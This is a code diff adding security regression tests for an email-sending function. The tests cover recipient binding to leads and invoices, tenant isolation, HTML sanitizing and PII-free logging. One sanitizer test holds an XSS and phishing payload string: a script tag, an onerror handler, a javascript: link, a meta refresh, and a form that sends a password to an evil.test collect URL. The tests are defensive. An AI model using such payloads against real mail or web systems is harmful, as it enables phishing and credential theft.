@@ -205,6 +205,16 @@ const SUPPRESSED_A = { [SUP_A]: { companyId: 'co-a', emailHash: sha(HOMEOWNER), 
 const NBD = '1phDvAVXHSg82wDLegAbQFq14Ci1';
 
 async function sendEmail(opts, body) {
+  // sendEmail binds the recipient to a record the caller can open (security
+  // batch 2026-10-03): the suite's lead-1 is the caller's own lead, carrying
+  // the homeowner's address — unless a scenario supplies its own.
+  opts = Object.assign({}, opts || {});
+  const tok = Object.assign({ uid: 'rep-a', companyId: 'co-a' }, opts.token || {});
+  if (!opts.noLead) {
+    opts.docs = Object.assign({
+      'leads/lead-1': { userId: tok.uid, companyId: tok.companyId || tok.uid, email: HOMEOWNER },
+    }, opts.docs || {});
+  }
   const { mod, w } = load('email-functions.js', opts);
   const res = await invoke(mod.sendEmail.__handler, {
     method: 'POST',
@@ -413,6 +423,83 @@ async function sendEmail(opts, body) {
     ok('an unverified sender → 403 email_unverified, nothing sent', res.statusCode === 403 && res.body.code === 'email_unverified' && w.sends.length === 0);
   }
 
+  // ═══ B2. recipient binding + HTML sanitizing (security batch 2026-10-03) ═══
+  // sendEmail used to take `to`, raw `html` and `replyTo` from any verified
+  // caller — an open phishing relay from the company's noreply@ address.
+  console.log('B2. sendEmail recipient binding');
+  {
+    const { res, w } = await sendEmail({}, { to: 'victim@elsewhere.test', kind: 'invoice' });
+    ok('a `to` that is not on the named lead → 422 recipient_not_on_record, nothing sent',
+      res.statusCode === 422 && res.body.code === 'recipient_not_on_record' && w.sends.length === 0,
+      res.statusCode + ' ' + JSON.stringify(res.body));
+  }
+  {
+    const { res, w } = await sendEmail({ noLead: true }, { leadId: undefined, to: 'victim@elsewhere.test', kind: 'invoice' });
+    ok('no record named at all → 422 record_required, nothing sent',
+      res.statusCode === 422 && res.body.code === 'record_required' && w.sends.length === 0,
+      res.statusCode + ' ' + JSON.stringify(res.body));
+  }
+  {
+    // Another tenant's lead: the attacker names it to borrow its address.
+    const { res, w } = await sendEmail({
+      docs: { 'leads/lead-1': { userId: 'rep-z', companyId: 'co-z', email: HOMEOWNER } },
+    }, { kind: 'invoice' });
+    ok('another tenant\'s lead → 403 record_forbidden, nothing sent',
+      res.statusCode === 403 && res.body.code === 'record_forbidden' && w.sends.length === 0,
+      res.statusCode + ' ' + JSON.stringify(res.body));
+  }
+  {
+    // A teammate's lead: a manager may (rules: company reader), a sales_rep not.
+    const teammate = { 'leads/lead-1': { userId: 'rep-other', companyId: 'co-a', email: HOMEOWNER } };
+    const rep = await sendEmail({ docs: teammate }, { kind: 'invoice' });
+    const mgr = await sendEmail({ docs: teammate, token: { role: 'manager' } }, { kind: 'invoice' });
+    ok('teammate lead: sales_rep 403, manager of the same company sends',
+      rep.res.statusCode === 403 && mgr.res.statusCode === 200 && mgr.w.sends.length === 1,
+      rep.res.statusCode + ' / ' + mgr.res.statusCode);
+  }
+  {
+    // Invoice path: the invoice's customerEmail is on record even when it
+    // differs from the lead's address.
+    const { res, w } = await sendEmail({
+      noLead: true,
+      docs: { 'invoices/inv-1': { companyId: 'co-a', createdBy: 'rep-a', customerEmail: 'billing@homeowner.test' } },
+    }, { leadId: undefined, invoiceId: 'inv-1', to: 'billing@homeowner.test', kind: 'invoice', html: '<p>Invoice</p>' });
+    ok('invoiceId in the caller\'s tenant → sends to the invoice\'s customerEmail',
+      res.statusCode === 200 && w.sends.length === 1 && w.sends[0].to === 'billing@homeowner.test',
+      res.statusCode + ' ' + JSON.stringify(res.body));
+    const other = await sendEmail({
+      noLead: true,
+      docs: { 'invoices/inv-1': { companyId: 'co-z', createdBy: 'rep-z', customerEmail: 'billing@homeowner.test' } },
+    }, { leadId: undefined, invoiceId: 'inv-1', to: 'billing@homeowner.test', kind: 'invoice', html: '<p>Invoice</p>' });
+    ok('another tenant\'s invoice → 403, nothing sent', other.res.statusCode === 403 && other.w.sends.length === 0);
+  }
+  {
+    const evil = '<p>Pay <a href="javascript:alert(1)">here</a></p><script>steal()</script>'
+      + '<img src=x onerror="steal()"><form action="https://evil.test/collect"><input name="pw"></form>'
+      + '<iframe src="https://evil.test"></iframe><a href="https://pay.stripe.com/x">Pay invoice</a>'
+      + '<meta http-equiv="refresh" content="0;url=https://evil.test"><a href="data:text/html;base64,PHNjcmlwdD4=">x</a>';
+    const { res, w } = await sendEmail({}, { kind: 'invoice', html: evil, replyTo: 'attacker@evil.test' });
+    const sent = (w.sends[0] && w.sends[0].html) || '';
+    ok('sanitized HTML: no <script>, <iframe>, <form>, <input>, on* handlers, javascript:/data:text URLs, meta refresh',
+      res.statusCode === 200 && !/<script|<iframe|<form|<input|onerror|javascript:|data:text|http-equiv/i.test(sent), sent);
+    ok('…while ordinary links and text survive', /href="https:\/\/pay\.stripe\.com\/x"/.test(sent) && /Pay invoice/.test(sent));
+    ok('replyTo that is not the caller\'s own address is dropped', w.sends[0] && w.sends[0].reply_to === undefined,
+      JSON.stringify(w.sends[0] && w.sends[0].reply_to));
+  }
+  {
+    const { w } = await sendEmail({ token: { email: 'rep@co-a.test' } }, { kind: 'invoice', replyTo: 'REP@co-a.test' });
+    ok('replyTo equal to the caller\'s own verified email is kept', w.sends[0] && w.sends[0].reply_to === 'rep@co-a.test');
+  }
+  {
+    const { w } = await sendEmail({}, { kind: 'invoice', body: 'Hi <b onmouseover=x>Sam</b>\nLine 2' });
+    const sent = (w.sends[0] && w.sends[0].html) || '';
+    ok('a plain-text body is escaped, not interpolated as HTML', /&lt;b onmouseover=x&gt;/.test(sent) && !/<b /.test(sent) && /<br>/.test(sent), sent);
+  }
+  {
+    const { w } = await sendEmail({}, { kind: 'invoice', attachments: [{ filename: 'a.pdf', path: 'https://evil.test/a.pdf' }] });
+    ok('caller attachments are not forwarded to Resend', w.sends[0] && w.sends[0].attachments === undefined);
+  }
+
   // ═══ C. funnel-recovery ════════════════════════════════════════════════
   console.log('C. runAbandonRecovery');
   {
@@ -448,6 +535,21 @@ async function sendEmail(opts, body) {
     await mod.runAbandonRecovery.__handler({});
     ok('register unreadable: nothing sent and the record is NOT claimed (retried next hour)',
       w.sends.length === 0 && !w.docs['funnel_abandoned/f-x'].recoveryEmailStatus);
+  }
+  {
+    // Dry run (the default in prod until enabled): the log line must not carry
+    // the visitor's name — PII in logs (security batch 2026-10-03).
+    const prev = process.env.FUNNEL_RECOVERY_ENABLED;
+    process.env.FUNNEL_RECOVERY_ENABLED = 'false';
+    const old = { toMillis: () => Date.now() - 2 * 3600e3 };
+    const { mod, w } = load('funnel-recovery.js', {
+      queries: { funnel_abandoned: [{ id: 'f-dry', data: { email: 'dry@example.com', firstName: 'Zebulon', createdAt: old } }] },
+    });
+    await mod.runAbandonRecovery.__handler({});
+    process.env.FUNNEL_RECOVERY_ENABLED = prev;
+    const dry = w.logs.info.filter((a) => a[0] === 'funnel_recovery_dry_run');
+    ok('dry-run log names no visitor (no firstName, no raw email)',
+      dry.length === 1 && !/Zebulon|dry@example\.com/.test(JSON.stringify(dry)), JSON.stringify(dry));
   }
 
   // ═══ D. lead-followup ══════════════════════════════════════════════════
